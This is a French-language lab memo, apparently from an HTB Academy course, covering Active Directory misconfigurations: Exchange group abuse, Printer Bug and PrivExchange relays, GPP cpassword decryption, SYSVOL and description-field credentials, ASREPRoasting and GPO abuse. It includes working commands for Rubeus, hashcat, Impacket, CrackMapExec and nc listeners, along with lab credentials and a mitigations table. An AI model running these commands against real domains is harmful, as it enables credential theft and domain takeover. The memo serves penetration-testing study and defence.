# Mémo — Miscellaneous Misconfigurations

> Grab-bag d'attaques et de mauvaises configs AD qu'on croise régulièrement en assessment.
> On alterne host **Windows (MS01)** et **Linux** (SSH vers `172.16.5.225`, `htb-student:HTB_@cademy_stdnt!`).
> Domaine : `INLANEFREIGHT.LOCAL`. DC : `172.16.5.5` / `ACADEMY-EA-DC01`.

| Misconfig | Résultat | Host |
|-----------|----------|------|
| Groupes Exchange (`Exchange Windows Permissions`, `Organization Management`) | WriteDACL domaine → DCSync | — |
| PrivExchange | Domain Admin via relay LDAP | Linux |
| Printer Bug (MS-RPRN) | coercion auth → relay LDAP → DCSync / RBCD | — |
| MS14-068 | PAC forgé → Domain Admin | — |
| Sniffing LDAP creds | creds (souvent privilégiées) en clair | Linux |
| `adidnsdump` | résolution de tous les records DNS | Linux |
| Password in Description | creds en clair | Windows |
| `PASSWD_NOTREQD` | comptes sans mot de passe requis | Windows |
| SYSVOL scripts / GPP cpassword | creds en clair / déchiffrables | — |
| ASREPRoasting | hash AS-REP crackable offline | both |
| GPO Abuse | local admin / scheduled task / droits | Windows |

---

## 1. Groupes Exchange

Une install Exchange par défaut (sans split-admin) est **sur-privilégiée** dans l'AD.

- **`Exchange Windows Permissions`** : pas un groupe protégé, mais ses membres peuvent **écrire une DACL sur l'objet domaine** → on peut se donner **DCSync**. On y ajoute un compte via une DACL mal configurée ou via un membre de **`Account Operators`**. On y trouve souvent des users *et* des machines.
- **`Organization Management`** : le « Domain Admins » d'Exchange — accès aux mailboxes de tous les users, et **full control** sur l'OU `Microsoft Exchange Security Groups` (qui contient `Exchange Windows Permissions`).
- Compromettre un **serveur Exchange** → souvent Domain Admin. Dump mémoire = 10s à 100s de creds clair / NTLM (users OWA mis en cache).

## 2. PrivExchange

Faille de la feature **PushSubscription** : tout user avec une mailbox peut **forcer le serveur Exchange à s'authentifier** vers un host arbitraire en HTTP.
- Le service Exchange tourne en **SYSTEM** et a **WriteDacl sur le domaine** (avant le CU 2019).
- On **relaie vers LDAP** → dump NTDS. Si LDAP indisponible → relay vers d'autres hosts.
- → **Domain Admin avec n'importe quel compte domaine authentifié**.

## 3. Printer Bug (MS-RPRN)

Faille du protocole **Print System Remote Protocol**. Tout user domaine se connecte au named pipe du spooler (`RpcOpenPrinter` + `RpcRemoteFindFirstPrinterChangeNotificationEx`) et **force le serveur à s'authentifier en SMB** vers un host choisi.
- Spooler = **SYSTEM**, installé par défaut (Windows Server + Desktop Experience).
- Relay LDAP → **DCSync** pour notre compte, ou → **RBCD** sur une machine qu'on contrôle (→ s'authentifier comme n'importe qui sur la victime).
- Utile **cross-forest** (host avec Unconstrained Delegation, ex. DC), si le trust autorise la délégation de TGT (plus par défaut).

Détection de la vuln avec `Get-SpoolStatus` (SecurityAssessment.ps1) :
```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# Status True = vulnérable
```

## 4. MS14-068

Faille Kerberos : un user standard peut **forger un PAC** (le PAC porte account name, ID, appartenance aux groupes, et est signé par le KDC). Le PAC forgé fait passer l'user pour un **Domain Admin**.
- Outils : **PyKEK**, Impacket.
- **Seule défense : patcher.** Box HTB d'illustration : **Mantis**.

## 5. Sniffing LDAP Credentials

Beaucoup d'apps/imprimantes stockent des **creds LDAP** dans leur console admin web (souvent mdp faibles/par défaut), parfois visibles en clair. Autre technique : la fonction **« test connection »** — on change l'IP LDAP vers notre host et on écoute sur le **port 389** :
```bash
nc -lvnp 389
# au test, le device envoie les creds, souvent en clair
```
Comptes LDAP souvent privilégiés → sinon foothold. Parfois un vrai serveur LDAP est nécessaire.

## 6. Énumérer les records DNS — `adidnsdump`

Par défaut tout user peut **lister les objets enfants** d'une zone DNS AD, mais une requête LDAP ne renvoie pas tout. `adidnsdump` résout tous les records → utile quand les hôtes ont des noms non parlants (`SRV01934` vs `JENKINS`).
```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
head records.csv       # certains records vides : ?,LOGISTICS,?

# -r = résout les records inconnus via requête A
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
head records.csv       # A,LOGISTICS,172.16.5.240  ← record "caché" révélé
```

## 7. Password in Description Field

Des creds traînent parfois dans le champ **Description / Notes**. Export CSV utile sur gros domaines.
```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
# ex. ldap.agent  *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

## 8. `PASSWD_NOTREQD`

Flag dans `userAccountControl` : l'user **n'est pas soumis à la politique de longueur** → mdp court ou vide possible (si le domaine l'autorise). Le flag ≠ « pas de mdp », juste « pas requis ». À énumérer et tester, et à mettre dans le rapport.
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## 9. Creds dans SYSVOL / scripts

Le partage **SYSVOL** (`scripts`, lisible par tout user authentifié) contient des .bat/.vbs/.ps1 → parfois des mdp.
```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
# sPwd = "!ILFREIGHT_L0cALADmin!"  ← mdp admin local
```
→ tester ce mdp sur les hosts avec CrackMapExec + `--local-auth` (cf. mémo password spraying).

## 10. GPP Passwords (cpassword)

À la création d'un GPP, un `.xml` est écrit sur SYSVOL (et caché localement). Peut servir à : map drives (`drives.xml`), créer users locaux, imprimantes, services, scheduled tasks, changer le mdp admin local. L'attribut **`cpassword`** est chiffré AES-256 mais **Microsoft a publié la clé privée** sur MSDN → déchiffrable par tout user.
- Patché par **MS14-025** (empêche d'en *créer*), mais les `Groups.xml` existants **restent**. Supprimer la policy (plutôt que l'unlink) laisse la copie cachée locale.

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
# → Password1

# modules CrackMapExec
crackmapexec smb -L | grep gpp
#   gpp_password   : plaintext des comptes poussés par GPP
#   gpp_autologin  : username/password d'autologon (Registry.xml)
```
Autres outils : `Get-GPPPassword.ps1`, module Metasploit.

### Autologon (Registry.xml)
Quand l'autologon est configuré par GPO, les creds sont **en clair** sur SYSVOL (non couvert par MS14-025).
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
# → Usernames: ['guarddesk']  Passwords: ['ILFreightguardadmin!']
```
Alt : `Get-GPPAutologon.ps1` (PowerSploit).

> 💡 Même si le compte GPP est locké/supprimé/expiré, **tester le mdp en spraying** : la réutilisation de mdp est fréquente.

## 11. ASREPRoasting

On récupère le **TGT (AS-REP)** de tout compte avec **« Do not require Kerberos pre-authentication »**. L'AS-REP est chiffré avec le mdp du compte → **crack offline**. Pas de SPN requis. Avec `GenericWrite`/`GenericAll` sur un compte, on peut activer le flag, roaster, puis le retirer.

```powershell
# Énumérer les comptes DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Rubeus (Windows) — /nowrap pour un format exploitable
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
```bash
# Crack (mode 18200)
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Depuis Linux (pas besoin d'être domain-joined) :
# Kerbrute dump auto l'AS-REP des users sans pre-auth pendant l'énum
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Impacket avec liste de users (-no-pass)
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```
> Même non crackable, l'AS-REP est à **reporter** (risque plus faible).

## 12. GPO Abuse

Des droits sur une **GPO** (via ACL mal configurée) → lateral movement, priv esc, compromission domaine, persistance. Attaques possibles :
- Ajouter des droits à un user (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`)
- Ajouter un **local admin** sur des hosts
- Créer une **scheduled task immédiate** (reverse shell, etc.)

```powershell
# Lister les GPO
Get-DomainGPO | select displayname          # PowerView
Get-GPO -All | Select DisplayName            # cmdlet GroupPolicy

# Les Domain Users ont-ils des droits sur une GPO ?
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
# chercher WriteProperty / WriteDacl / GenericWrite / WriteOwner

# GUID → nom lisible
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
Exploitation : **SharpGPOAbuse** (ajout local admin, scheduled task, startup script).
> ⚠️ Les actions s'appliquent à **toutes** les machines de l'OU liée. Sur une OU de 1000 hosts, ne pas s'ajouter en local admin partout — utiliser les options qui ciblent un user/host précis. Audit : `group3r`, `ADRecon`, `PingCastle`, BloodHound.

---

## 13. À retenir

| Misconfig | Commande / outil clé | Garde-fou |
|-----------|----------------------|-----------|
| Exchange groups | ajout dans `Exchange Windows Permissions` → WriteDACL → DCSync | split-admin model |
| PrivExchange | relay HTTP → LDAP | CU 2019 (retire WriteDacl) |
| Printer Bug | `Get-SpoolStatus` ; relay LDAP → DCSync/RBCD | désactiver spooler sur les DC |
| MS14-068 | PyKEK / Impacket | **patcher** |
| Sniff LDAP | `nc -lvnp 389` + test connection | mdp forts, pas de LDAP clair |
| DNS | `adidnsdump -r` | — |
| Description | `Get-DomainUser` + `description` | ne pas y mettre de mdp |
| `PASSWD_NOTREQD` | `Get-DomainUser -UACFilter PASSWD_NOTREQD` | retirer le flag |
| SYSVOL scripts | `ls/cat \\DC\SYSVOL\...\scripts` | nettoyer les scripts |
| GPP cpassword | `gpp-decrypt` ; CME `gpp_password`/`gpp_autologin` | MS14-025 + supprimer `Groups.xml` |
| ASREPRoast | `Rubeus asreproast` / `GetNPUsers.py` → `hashcat -m 18200` | activer pre-auth, mdp forts |
| GPO Abuse | `Get-DomainGPO \| Get-ObjectAcl` + `SharpGPOAbuse` | restreindre les ACL sur GPO |
